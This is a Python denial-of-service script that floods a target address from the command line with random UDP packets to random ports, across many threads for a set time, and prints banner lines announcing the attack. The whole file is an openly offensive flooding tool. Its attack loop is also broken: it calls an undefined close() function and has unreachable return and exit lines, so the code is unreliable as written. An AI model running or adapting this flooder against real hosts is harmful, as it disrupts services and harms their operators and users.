import socket, random, threading, sys, time
from requests import get
from colorama import Fore, Back, Style


hostname = socket.gethostname()
public_ip = get('https://api.ipify.org').text

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print("Command usage: python file.py <target> <threads> <time>")
    sys.exit()
timeout = time.time() + 1 * timer

def attack():
    bytes = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        dport = random.randint(20,55500)
        sock.sendto(bytes*random.randint(5,15),(target, dport))
        close()
        return
        sys.exit()

print(Fore.YELLOW + "Hostname: ", hostname)
print(Fore.YELLOW + "Public IP: ", public_ip)
print("")
print("")
print(Fore.GREEN + "\n[+] Starting Attack..")
for x in range(0, threads):
    threading.Thread(target=attack).start()

print(Fore.CYAN + "[+]Attack done!")
